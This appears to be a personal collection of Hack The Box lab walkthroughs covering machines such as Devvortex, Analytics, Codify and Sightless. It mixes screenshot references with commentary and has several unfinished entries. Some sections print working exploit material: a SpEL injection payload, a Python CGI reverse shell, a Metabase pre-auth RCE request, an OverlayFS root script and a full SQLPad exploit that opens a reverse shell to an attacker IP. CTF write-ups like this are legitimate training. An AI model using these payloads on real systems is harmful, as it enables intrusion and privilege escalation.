I'll write my walkthrough the HTB machines that I’d be doing.

---

## Very Easy Machines

### ApacheCGI ✅

The base of this machine is that is using apache 2.4.49 vulnerable to PAth traversal y RCE

> [!info] Apache HTTP Server Path Traversal & Remote Code Execution (CVE-2021-41773 & CVE-2021-42013) | Qualys Security Blog  
> On October 4, 2021, Apache HTTP Server Project released Security advisory on a Path traversal and File disclosure vulnerability in Apache HTTP Server 2.  
> [https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013)  

I used the following exploit to test if is vulnerable

![[Untitled 539.png|Untitled 539.png]]

As seen, the /icons directory is vulnerable

![[Untitled 1 5.png|Untitled 1 5.png]]

Now for this version we also have an RCE

![[Untitled 2 5.png|Untitled 2 5.png]]

![[Untitled 3 5.png|Untitled 3 5.png]]

![[Untitled 4 5.png|Untitled 4 5.png]]

Now we need the root flag

After trying so many things like enviroment variables (env), sudo -l, ps, i found some binaries that have SUID permissions

![[Untitled 5 4.png|Untitled 5 4.png]]

Using GTFO Bins I found this to leave the restricted shell, and if this works, it will spawn a shell as root

![[Untitled 6 3.png|Untitled 6 3.png]]

Using this I read the root flag

![[Untitled 7 3.png|Untitled 7 3.png]]

![[Untitled 8 3.png|Untitled 8 3.png]]

But this did not give me ROOT access

### SuperProfile ✅

![[Untitled 9 3.png|Untitled 9 3.png]]

smbclient to list available shares

![[Untitled 10 3.png|Untitled 10 3.png]]

![[Untitled 11 3.png|Untitled 11 3.png]]

![[Untitled 12 3.png|Untitled 12 3.png]]

usign systeminfo we can gather information.

![[Untitled 13 3.png|Untitled 13 3.png]]

I can see that some hot fixes are installed, I can find vulnerabilities.

![[Untitled 14 3.png|Untitled 14 3.png]]

> [!info] User Profile Arbitrary Junction Creation Local Privilege Elevation  
> Rapid7's VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.  
> [https://www.rapid7.com/db/modules/exploit/windows/local/cve_2022_26904_superprofile/](https://www.rapid7.com/db/modules/exploit/windows/local/cve_2022_26904_superprofile/)  

> [!info] User Profile Arbitrary Junction Creation Local Privilege Elevation - Metasploit - InfosecMatter  
> Detailed information about how to use the exploit/windows/local/cve_2022_26904_superprofile metasploit module (User Profile Arbitrary Junction Creation Local Privilege Elevation) with examples and msfconsole usage snippets.  
> [https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/cve_2022_26904_superprofile](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/cve_2022_26904_superprofile)  

In this case Ill use metasploit

First i create an executable to use in the win machine

![[Untitled 15 3.png|Untitled 15 3.png]]

Now i start a HTTP server

Now using curl i download the executable

![[Untitled 16 3.png|Untitled 16 3.png]]

Once we execute this .exe and start msconsole to establish the session

![[Untitled 17 3.png|Untitled 17 3.png]]

I had to set AutoCheck false for it to work

![[Untitled 18 3.png|Untitled 18 3.png]]

  

### SpringData ✅

![[Untitled 19 3.png|Untitled 19 3.png]]

Ín the source code

![[Untitled 20 3.png|Untitled 20 3.png]]

This is the default error page of SpingBoot Framework

![[Untitled 21 3.png|Untitled 21 3.png]]

Looking for mongodb springboot vulnerability I found

> [!info] Spring Data MongoDB SpEL Expression Injection Vulnerability (CVE-2022-22980)  
> Level up your Java code and explore what Spring can do for you.  
> [https://spring.io/blog/2022/06/20/spring-data-mongodb-spel-expression-injection-vulnerability-cve-2022-22980](https://spring.io/blog/2022/06/20/spring-data-mongodb-spel-expression-injection-vulnerability-cve-2022-22980)  

If we look for a PoC or a exploit for this CVE

> [!info] Spring_cve-2022-22980/payload at main · Vulnmachines/Spring_cve-2022-22980  
> spring data mongodb remote code execution | cve-2022-22980 poc - Vulnmachines/Spring_cve-2022-22980  
> [https://github.com/Vulnmachines/Spring_cve-2022-22980/blob/main/payload](https://github.com/Vulnmachines/Spring_cve-2022-22980/blob/main/payload)  

Now with the request we intercepted in Burp lets paste the payload after we do some changes

![[Untitled 22 3.png|Untitled 22 3.png]]

![[Untitled 23 2.png|Untitled 23 2.png]]

This was not posible so ill try to create the script and then download it in the victim machine.  
Now what worked for me is that I captured the POST request of the search bar and there I injected the payload.  

Finally i have to download the script to victim’s machine i injected the RCE wget and used python server

![[Untitled 24 2.png|Untitled 24 2.png]]

DOES NOT WORKS  
This is the payload used for this exploitation of SpEL  

`T(java.lang.Runtime).getRuntime().exec("wget http://<Attacker_IP>:<PORT>/script -o /dev/shm/script")`

As seen, I'm using the temporary directory /dev/shm but is it also possible to use /tmp

This is the how I created the script binary.

```Python
cat > script <<EOF
bash -i &>/dev/tcp/10.10.14.22/7777 0>&1
EOF
```

And this is how I downloaded it to the victim’s machine. See how I am using wget and outputing the file to to /dev/shm/script

![[Untitled 25 2.png|Untitled 25 2.png]]

Then I started nc listening on port 6666 and launched the reverse shell

![[Untitled 26 2.png|Untitled 26 2.png]]

I got the flag.

![[Untitled 27 2.png|Untitled 27 2.png]]

  

### Spark ✅

![[Untitled 28 2.png|Untitled 28 2.png]]

![[Untitled 29 2.png|Untitled 29 2.png]]

![[Untitled 30 2.png|Untitled 30 2.png]]

Searching for a PoC

> [!info] GitHub - HuskyHacks/cve-2022-33891: Apache Spark Shell Command Injection Vulnerability  
> Apache Spark Shell Command Injection Vulnerability - HuskyHacks/cve-2022-33891  
> [https://github.com/HuskyHacks/cve-2022-33891?source=post_page-----7c76d0e53155--------------------------------](https://github.com/HuskyHacks/cve-2022-33891?source=post_page-----7c76d0e53155--------------------------------)  

The base is `` http://<victim>:8080/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash` ``

![[Untitled 31 2.png|Untitled 31 2.png]]

(I had to use sh instead of bash)

![[Untitled 32 2.png|Untitled 32 2.png]]

![[Untitled 33 2.png|Untitled 33 2.png]]

### Ringularity✅

![[Untitled 34 2.png|Untitled 34 2.png]]

It is using python

![[Untitled 35 2.png|Untitled 35 2.png]]

The file is uploaded to http://\<serverIP\>/uploads/\<filename\>

![[Untitled 36 2.png|Untitled 36 2.png]]

If we upload a script

![[Untitled 37 2.png|Untitled 37 2.png]]

If we upload this as .py the serves throws error

This (I found later) is because that we have to format the output

Final script

```Python
#!/usr/bin/python3
 
import os 
 
print("Content-type: text/html", end="\r\n\r\n", flush=True)
f = os.system("bash -c 'bash -i &>/dev/tcp/<IP>/<PORT>'")
print(f"{f}")
```

![[Untitled 38 2.png|Untitled 38 2.png]]

![[Untitled 39 2.png|Untitled 39 2.png]]

Now lets enumerate

![[Untitled 40 2.png|Untitled 40 2.png]]

The binary /usr/bin/julia is a binary for Julia Lang

[https://julialang.org/downloads/platform/](https://julialang.org/downloads/platform/)

Now the binary appears in GTFO

> [!info] julia | GTFOBins  
> It can be used to break out from restricted environments by spawning an interactive system shell.  
\> [https://gtfobins.github.io/gtfobins/julia/#suid](https://gtfobins.github.io/gtfobins/julia/#suid)  

![[Untitled 41 2.png|Untitled 41 2.png]]

![[Untitled 42 2.png|Untitled 42 2.png]]

### PwnKit ✅

Using dpkg -l I listed every package installed

![[Untitled 43 2.png|Untitled 43 2.png]]

Basically this is the famous PwnKit vuln, a vulnerable Pkexec binary to elevate privs.

I used this repo

https://github.com/arthepsy/CVE-2021-4034

Once i created the script, I started a python server to download this into the victim’s machine after i establish the reverse shell

![[Untitled 44 2.png|Untitled 44 2.png]]

Once downloaded I have to execute this

![[Untitled 45 2.png|Untitled 45 2.png]]

I had to compile the c code in my machien

![[Untitled 46 2.png|Untitled 46 2.png]]

Then I download the script again

![[Untitled 47 2.png|Untitled 47 2.png]]

In my case I had to use another binary, from this repo

[https://github.com/ly4k/PwnKit/raw/main/PwnKit](https://github.com/ly4k/PwnKit/raw/main/PwnKit)  
Since the previous needed another gcc library that the victim did not had  

![[Untitled 48 2.png|Untitled 48 2.png]]

### Prequel ✅

![[Untitled 49 2.png|Untitled 49 2.png]]

![[Untitled 50 2.png|Untitled 50 2.png]]

As we can see, default creds are in use. root:root

![[Untitled 51 2.png|Untitled 51 2.png]]

![[Untitled 52 2.png|Untitled 52 2.png]]

![[Untitled 53 2.png|Untitled 53 2.png]]

This is a my-sql SHA1 encoding

![[Untitled 54 2.png|Untitled 54 2.png]]

Using john the ripper I cracked the password

Now, the only place that I think we can use this creds in the FTP or SSH service, since there is nothing in the webpage.

![[Untitled 55 2.png|Untitled 55 2.png]]

And yes, this worked

![[Untitled 56 2.png|Untitled 56 2.png]]

We have this directory and the index.html file

This is the Apache default html file, so there is nothing there

I realized later that the directory in FTP has write permissions

![[Untitled 57 2.png|Untitled 57 2.png]]

I uploaded the creds file for test

![[Untitled 58 2.png|Untitled 58 2.png]]

And it is indeed stored in the server.

We can try for PHP code.

![[Untitled 59 2.png|Untitled 59 2.png]]

As seen, the server is not interpreting PHP

After a long time I will follow this PoC for exploiting a vulnerability that apparenttly has mariadb version 10.3.27

https://github.com/shamo0/CVE-2021-27928-POC

![[Untitled 60 2.png|Untitled 60 2.png]]

Now I need to upload this reverse shell to the server, and since I have write permissions via ftp

Once the binary is uploaded to /var/www/html/CVE..

We set this variable

And in our machine using nc listen for the conection

![[Untitled 61 2.png|Untitled 61 2.png]]

![[Untitled 62 2.png|Untitled 62 2.png]]

EN ESTE CASO MIRE WRITEUP YA QUE NO ENCTRABA NADA, AL PARECER ENUMERANDO /ETC/FSTAB SE ENCUENTRAN CREDENCIALES EN TEXTO PLANO

In the fstab file located in /etc there is plaintext credentials

![[Untitled 63 2.png|Untitled 63 2.png]]

Lara is in the system, as listed in the passwd, since i cannot change user I tried ssh

![[Untitled 64 2.png|Untitled 64 2.png]]

Here was the flag and I found that lara can excute mysql as sudo

![[Untitled 65 2.png|Untitled 65 2.png]]

Since I have the password of the root user for sql

  

### Overlay ✅

![[Untitled 66 2.png|Untitled 66 2.png]]

> [!info] NVD - CVE-2021-3493  
> NIST has updated the  
> [https://nvd.nist.gov/vuln/detail/CVE-2021-3493](https://nvd.nist.gov/vuln/detail/CVE-2021-3493)  

The reverse shell was done using FIFO **READ ABOUT THIS**

Serving a server I download the exploit in to the victims machine

![[Untitled 67 2.png|Untitled 67 2.png]]

COULD NOT FINISH THE MACHINE THE WAY THAT IS INTENDED TO, I ESCALATED USING PWNKIT FOR EXPLOITING PKEXEC VULN. I WASNT ABLE TO EXPLOIT THE OVERLAY FS VULN SINCE THE MACHINE DID NOT HAD THE NEEDED LIBRARIES

COULD NOT COMPILE NEITHER EXECUTE THE PRECOMPILED BINARY.

![[Untitled 68 2.png|Untitled 68 2.png]]

![[Untitled 69 2.png|Untitled 69 2.png]]

### Looney

> [!info] How to check glibc version on Linux  
> The GNU C library (glibc) is the GNU implementation of the standard C library.  
> [https://www.xmodulo.com/check-glibc-version-linux.html](https://www.xmodulo.com/check-glibc-version-linux.html)  

  

## Easy Machines

### Devvortex ✅

ESTUDIAR MAS ENUMERACION CMS

I start with a simple scan in NMAP

![[Untitled 70 2.png|Untitled 70 2.png]]

Found ports 22 and 80

If i try to see the webpage we are redirected to a domain, to see this domain I have to hardcode it in the /etc/hosts to be resolved

![[Untitled 71 2.png|Untitled 71 2.png]]

As per the nmap -sCV scan we have this result

![[Untitled 72 2.png|Untitled 72 2.png]]

We can see that is a ubuntu focal

![[Untitled 73 2.png|Untitled 73 2.png]]

Now we added the domain to the /etc/hosts we can see the webpage

![[Untitled 74 2.png|Untitled 74 2.png]]

Using gobuster I could not found any directories

![[Untitled 75 2.png|Untitled 75 2.png]]

Let's try some subdomains enumeration.

I'll use ffuf because gobuster is not working for me.

![[Untitled 76 2.png|Untitled 76 2.png]]

ill hide the 302 codes.

![[Untitled 77 2.png|Untitled 77 2.png]]

And I found the dev.devvortex.htb subdomain

I have to add this subdomain too to the /etc/hosts

I started another directory enumeration as there is nothing at plain sigth in the webpage

![[Untitled 78 2.png|Untitled 78 2.png]]

In the directory listing using gobuster I found some interesting paths

![[Untitled 79 2.png|Untitled 79 2.png]]

![[Untitled 80 2.png|Untitled 80 2.png]]

I found directories listed in the robots.txt

![[Untitled 81 2.png|Untitled 81 2.png]]

Also, I found manually the README.txt of Joomla CMS

![[Untitled 82 2.png|Untitled 82 2.png]]

Looking for some exploits in exploit db

![[Untitled 83 2.png|Untitled 83 2.png]]

I tried the 4.2.8 exploit for Unauthenticated Information Disclosure, this tries for a /config and a /users in the API.

![[Untitled 84 2.png|Untitled 84 2.png]]

This fetchs USERS and CONFIG, and i found credential for a super user Lewis and it password

![[Untitled 85 2.png|Untitled 85 2.png]]

![[Untitled 86 2.png|Untitled 86 2.png]]

I made this into a bash script.

![[Untitled 87 2.png|Untitled 87 2.png]]

```Bash
#!/bin/bash

# URL to fetch users /api/index.php/v1/users?public=true
# URL to fetch config /api/index.php/v1/config/application?public=true

\#Global Variables
declare -r main_url='http://dev.devvortex.htb'
declare -r config_path='/api/index.php/v1/config/application?public=true'
declare -r users_path='/api/index.php/v1/users?public=true'


\#Main
echo -e "\n [*] Obteniendo datos de usuarios en $main_url$users_path\n"
curl -s -X GET "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq '.data' | grep -E 'user|
password' | tr -d ',' | tr -d '\"'
```

Once inside the CMS we are logged in as admin.

So if I navigate to the templates, specifically **system>templates>admin templates>login.php**

![[Untitled 88 2.png|Untitled 88 2.png]]

Added the reverse shell one liner.

![[Untitled 89 2.png|Untitled 89 2.png]]

And voila

As seen early, there is a MySQL DB so lets connect with the user lewis

![[Untitled 90 2.png|Untitled 90 2.png]]

Using the DB Joomla, I found the table sd4fg_users, where I also found

![[Untitled 91 2.png|Untitled 91 2.png]]

![[Untitled 92 2.png|Untitled 92 2.png]]

Using crackstation WONT WORK

Neither hashcat worked

I had to use john the ripper and i SAW A WRITEUP

![[Untitled 93 2.png|Untitled 93 2.png]]

Once we have this password, we can log in as logan

![[Untitled 94 2.png|Untitled 94 2.png]]

And we have the user flag

We need to escalate now

Listing all commands as sudo if any

![[Untitled 95 2.png|Untitled 95 2.png]]

We can see that we have cersion 2.20.11 of this apport-cli

https://github.com/diego-tella/CVE-2023-1326-PoC

![[Untitled 96 2.png|Untitled 96 2.png]]

So looking for vulns, we have this

Lets test

So if we use the reporter with the command /usr/bin/apport-cli -f

And we use the menu until we have the option to see this report we have a VIM like tool

And we can exectute commands? If so, we are using this cli as root

![[Untitled 97 2.png|Untitled 97 2.png]]

And yes, we can

![[Untitled 98 2.png|Untitled 98 2.png]]

Machine finished root pwned hacked

  

### Analytics ✅

![[Untitled 99 2.png|Untitled 99 2.png]]

I started scaning with NMAP to found ports 22 and 80 open

![[Untitled 100 2.png|Untitled 100 2.png]]

Starting from the web I had to add the domain to /etc/hosts

![[Untitled 101 2.png|Untitled 101 2.png]]

Once inside, I can see that there is a login webpage, it redirects us to another subdomain that needs to be added to /etc/hosts

In paralel I used NMAP to scan services and try some scripts

![[Untitled 102 2.png|Untitled 102 2.png]]

Technologies of main page

![[Untitled 103 2.png|Untitled 103 2.png]]

Technologies of login page

![[Untitled 104 2.png|Untitled 104 2.png]]

This login page need a valid email, and the contact email of the domain can be found in the main page **due@analytical.com**

LEARN HOW TO USE GOBUSTER FOR SUBDOMINS IS NOT WORKING

Using ffuf I started enumerating subdomains, I know that there is one already for the Login Page

The only subdomain found was data

Since I cant find anything Ill try with metabase

So theres a PreAuth RCE vulnerabilty for metabase

> [!info] Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)  
> Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!  
> [https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646)  

> [!info]  
>  
> [https://github.com/m3m0o/metabase-pre-auth-rce-poc/blob/main/main.py](https://github.com/m3m0o/metabase-pre-auth-rce-poc/blob/main/main.py)  

TL;DR

![[Untitled 105 2.png|Untitled 105 2.png]]

Using this POST request, where the token is found on /api/session/properties and the base64 encoded is `bash -i >&/dev/tcp/IP/PORT 0>&1`

```Bash
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

![[Untitled 106 2.png|Untitled 106 2.png]]

TOKEN PoC

Now Ill use the script from [[Machines HTB]] to gain a reverse shell

![[Untitled 107 2.png|Untitled 107 2.png]]

And we have access

![[Untitled 108 2.png|Untitled 108 2.png]]

![[Untitled 109 2.png|Untitled 109 2.png]]

Enumerating the environment variables using `env` I found

![[Untitled 110 2.png|Untitled 110 2.png]]

So since I cannot use ssh within the shell, Ill try SSH

![[Untitled 111 2.png|Untitled 111 2.png]]

Once we are in using `uname -a` I searched in google for the kernel version to find a vulnerability

> [!info]  
>  
> [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh)  

```Bash
metalytics@analytics:~$ cd ../../tmp
metalytics@analytics:/tmp$ nano exploit.sh
metalytics@analytics:/tmp$ cat exploit.sh 
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
metalytics@analytics:/tmp$ chmod +x exploit.sh 
```

![[Untitled 112 2.png|Untitled 112 2.png]]

### Codify ✅

Some scans to see what we have

Ports 22,80,3000

The page is for testing code

![[Untitled 113 2.png|Untitled 113 2.png]]

I found that is using vm2, and doing some research in google i found that it has vulnerabilities related to RCE, and escaping the sandbox.

I found two and its PoC code.

[https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

[https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)

The second one for the version 3.9.17 worked for me since i executed code.

![[Untitled 114 2.png|Untitled 114 2.png]]

So, lets try to get a reverse shell.

![[Untitled 115 2.png|Untitled 115 2.png]]

![[Untitled 116 2.png|Untitled 116 2.png]]

Found a username appart from **svc** which is the one we are using.

Using ps found that pm2 is in use

![[Untitled 117 2.png|Untitled 117 2.png]]

Using pm2 which is a node.js server

![[Untitled 118 2.png|Untitled 118 2.png]]

Now if I describe what is this process doing

![[Untitled 119 2.png|Untitled 119 2.png]]

We see that is executing a `index` as cluster mode, this is why we have so many indexes.

If go to this /www directory I found that in the contact directory we have .db file

![[Untitled 120 2.png|Untitled 120 2.png]]

![[Untitled 121 2.png|Untitled 121 2.png]]

Since the shell was closing every time I made a workaround to deploy a python3 http server

![[Untitled 122 2.png|Untitled 122 2.png]]

And downloaded th .db to my machine

![[Untitled 123 2.png|Untitled 123 2.png]]

Using sqlite3

![[Untitled 124 2.png|Untitled 124 2.png]]

Using john and the rockyou dictionary

![[Untitled 125 2.png|Untitled 125 2.png]]

Now lets connect with SSH

![[Untitled 126 2.png|Untitled 126 2.png]]

Listed sudo permissions

![[Untitled 127 2.png|Untitled 127 2.png]]

This is what the script haves

![[Untitled 128 2.png|Untitled 128 2.png]]

As we can see, the script checks for a password, but this password is not in quotation marks, so it is not a string.

![[Untitled 129 2.png|Untitled 129 2.png]]

I tried entering an asterix * and the “password” worked

![[Untitled 130 2.png|Untitled 130 2.png]]

So what we can try is to test every letter

THE MACHINE WAS UNSTABLE, IT DROPS THE SSH CONNECTIONS, SO ONCE I SAW THE SCRIPT WORKED I GRABBED THE PASS AND THE ROOT FLAG FROM A WRITEUP

HTB FREE IS BULLSHIT

I had to use the script step by step

- Script
    
    ```Python
    import string
    import subprocess
    all = list(string.ascii_letters + string.digits)
    password = "kljh12k3jhaskjh12kjh3"
    found = False
    
    while not found:
        for character in all:
            command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
            output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
    
            if "Password confirmed!" in output:
                password += character
                print(password)
                break
        else:
            found = True
    ```
    

![[Untitled 131 2.png|Untitled 131 2.png]]

  

### Perfection

Starting with the enumeration

![[Untitled 132 2.png|Untitled 132 2.png]]

![[Untitled 133 2.png|Untitled 133 2.png]]

The page is about a calculator

![[Untitled 134 2.png|Untitled 134 2.png]]

![[Untitled 135 2.png|Untitled 135 2.png]]

Trying to input HTML Tag <h1></h1> it blocked my input

![[Untitled 136 2.png|Untitled 136 2.png]]

  

### Gem

Started with nmap —open but there was only port 22 exposed

So I have to try another thing, because SSH port does not seems vulnerable

Since I used -sT the port 3000 do not answered, using -sS did answered

![[Untitled 137 2.png|Untitled 137 2.png]]

![[Untitled 138 2.png|Untitled 138 2.png]]

I try and create a user with n3lairs@n3l4irs.com:test123

![[Untitled 139 2.png|Untitled 139 2.png]]

Once th account was created I noticed that the account has an ID in this case 7

![[Untitled 140 2.png|Untitled 140 2.png]]

![[Untitled 141 2.png|Untitled 141 2.png]]

![[Untitled 142 2.png|Untitled 142 2.png]]

[https://github.com/mpgn/CVE-2019-5418](https://github.com/mpgn/CVE-2019-5418)

Looking for vulnerabilities I found this CVE from the 2019 in which is describes File Disclosure

![[Untitled 143 2.png|Untitled 143 2.png]]

In the passwd file, we can see two users and its home directory, pearl and ruby

As seen, we can list its ssh private key

![[Untitled 144 2.png|Untitled 144 2.png]]

And we are in with the user ruby

![[Untitled 145 2.png|Untitled 145 2.png]]

In this case I elevated my privileges abusing PkExec vulnerabilty using PwnKit

Since the machine is created to be resolved abusing some yaml dependencies and cron Ill try this way

---

In this case, looking through payroll directories, I found some dbs

![[Untitled 146 2.png|Untitled 146 2.png]]

![[Untitled 147 2.png|Untitled 147 2.png]]

There is nothing interesting in this DB

In the dev DB there some user and hashes

![[Untitled 148 2.png|Untitled 148 2.png]]

![[Untitled 149 2.png|Untitled 149 2.png]]
### Cicada✅ 
![[Pasted image 20241124161403.png]]
Once enumerated we have this services exposed
![[Pasted image 20241124163214.png]]
Using smbclient found this 
![[Pasted image 20241124163249.png]]
Using the HR resource found this note
![[Pasted image 20241124163430.png]]
So we have a password for a user, now we can try a password spray
Then using netexec I bruteforced the usernames by RID
![[Pasted image 20241124164609.png]]
Then extracted the usernames usign `grep -oP 'CICADA\\\K[^\s(]+' smb_output.txt
 `
 ![[Pasted image 20241124164714.png]]
  Now we have users and a valid password
  ![[Pasted image 20241124165524.png]]
  The password belongs to michael.wrightson
  Enumerating users i found that david.orelious has the password as description.
  ![[Pasted image 20241124165700.png]]
  Using smbmap and the user david.orelious we have a new resource available
  ![[Pasted image 20241124170219.png]]
  ![[Pasted image 20241124170756.png]]
  I found a password inside the script, with this password I listed the resources with smbmap
  ![[Pasted image 20241124171038.png]]
  Looking through didnt found anything useful, so I used evil-winrm to get a shell
  ![[Pasted image 20241124171547.png]]
We have the user flag
![[Pasted image 20241124171732.png]]

Now we need to escalate privs, so i look at what privileges do I have as the current user
![[Pasted image 20241124172559.png]]
Using hacktricks i found some ways to exploit this
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sebackupprivilege

And i will use this resource

https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/refs/heads/master/Privesc/Acl-FullControl.ps1

How to download a file from cmd windows
https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil

Remember the dot before exec an ps1
![[Pasted image 20241124173922.png]]
![[Pasted image 20241124174034.png]]
Got the root flag


### CAP ✅
#### Initial access
I started enumerating the services, I found ports 21,22 and 80 opened
Lets see what we have in the webpage
![[Pasted image 20241225185456.png]]Using gobuster didnt found any other directory
![[Pasted image 20241225191350.png]]
I also tried the FTP port but anonymous log in is disabled
One of the options of the page is a Sec snapshot, in which a 5 seconds PCAP is available to download
![[Pasted image 20241225191725.png]]
I realized that the data is labeled in the URL, so I tried to exploit IDORs
And I found the following PCAP
![[Pasted image 20241225191835.png]]Lets download the PCAP and open it with wireshark
In the PCAP we have plain creds for the user nathan in the FTP service
![[Pasted image 20241225192211.png]]
USER nathan PASS Buck3tH4TF0RM3!
and we have the user flag in the FTP server
![[Pasted image 20241225192951.png]]
![[Pasted image 20241225193005.png]]
#### Priv Esc
The same password is used for SSH, so we got a remote connection to machine
![[Pasted image 20241225193234.png]]
Did not found nothing using `find` nor `sudo -l`
I used LinPEAS so is easier, and it found some capabilities on the python3 binary
![[Pasted image 20241225200015.png]]
Using GTFOBins I found how to exploit this
![[Pasted image 20241225200113.png]]
![[Pasted image 20241225200247.png]]

### Sightless
#### Initial Access
![[Pasted image 20241225215318.png]]
The URL couldnt be resolved since is unknown![[Pasted image 20241225215353.png]]
So I had to add it to /etc/hosts
Perfect, now we can access
![[Pasted image 20241225220128.png]]
The only thing that caught my attention is this SQLPad
![[Pasted image 20241225220113.png]]
After performing some dirsearch and subdomain fuzzing I did not found anything usefull
In the SQLPad tab I found that we can provide anew connection to a database, so I tried every driver and it seems that snowflake is active and running in the victim machine
![[Pasted image 20241225222426.png]]
It seems that this does not lead anywhere
Looking through the internet for what SQLPad is I found that it has vulnerabilities associated
![[Pasted image 20241225223148.png]]
![[Pasted image 20241225223227.png]]
So I found some exploits for this version
https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944/blob/master/CVE-2022-0944
```bash
#!/bin/bash

# Inform the user to run netcat manually
echo "Please make sure to start a listener on your attacking machine using the command:"
echo "nc -lvnp 9001"
echo "Waiting for you to set up the listener..."

# Pause for confirmation from the user before continuing
read -p "Press [Enter] when you are ready..."

# Prompt the user for the target server and attacker's IP address
echo "Please provide the target host (e.g., x.x.com): "; read TARGET
echo "Please provide your IP address (e.g., 10.10.16.3): "; read REVERSE_IP

# Set reverse port for connection
REVERSE_PORT=9001

# Prepare the POST data with the payload injected in the 'host' and 'database' fields
POST_DATA=$(cat <<EOF
{
  "name": "divineclown",
  "driver": "mysql",
  "data": {
    "host": "",
    "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
  },
  "host": "",
  "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
}
EOF
)

# Perform the POST request using curl to trigger the payload on the target server
curl -i -s -k -X POST -H "Host: $TARGET" -H "Accept: application/json" -H "Content-Type: application/json" -H "Origin: http://$TARGET" -H "Referer: http://$TARGET/queries/new" -H "Connection: keep-alive" --data-binary "$POST_DATA" "http://$TARGET/api/test-connection" > /dev/null

echo "Exploit sent. If everything went well, check your listener for a connection on port $REVERSE_PORT."
```

Perfect, I will use this to exploit the vulnerability
![[Pasted image 20241225223931.png]]
We are in 
![[Pasted image 20241225224453.png]]
But it seems like this is a Docker container since I am root but nothing is here
![[Pasted image 20241225224554.png]]
![[Pasted image 20241225224622.png]]
This script is interesting 
![[Pasted image 20241225225632.png]]
Another thing founded was the /etc/shadow that has a user called michael 
Lets see if any of these hashes is a common password
![[Pasted image 20241225231206.png]]
Lets use hashcat 
![[Pasted image 20241225231705.png]]
Seems that this is not the proper has, so I specified another one for SHA512
![[Pasted image 20241225232130.png]]
Done! I Cracked one password
![[Pasted image 20241225233259.png]]
![[Pasted image 20241225233349.png]]
Lets try the passwords in the other services
For root in SSH did not worked
![[Pasted image 20241225233806.png]]
Good, we are in as Michael
![[Pasted image 20241225233939.png]]
#### Priv Esc
At first we do not have anything to leverage
![[Pasted image 20241225234054.png]]
We have anohter user called john
![[Pasted image 20241225234342.png]]
Using linPEAS found the following
![[Pasted image 20241225235232.png]]![[Pasted image 20241225235430.png]]
I had to seek the writeup since I was lost here
I used the ss command with the following flags
- t TCP connections
- n 
- l All lsitening sockets 
- p Check PIDs
![[Pasted image 20241226000513.png]]
A TERMINAR ES MUY DIFICIL EL PRIV ESC

### TwoMillion✅
#### Initial Access
About TwoMillion

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.

![[Pasted image 20250106164654.png]]
Added the domain to /etc/hosts
So we have a legacy HTB page
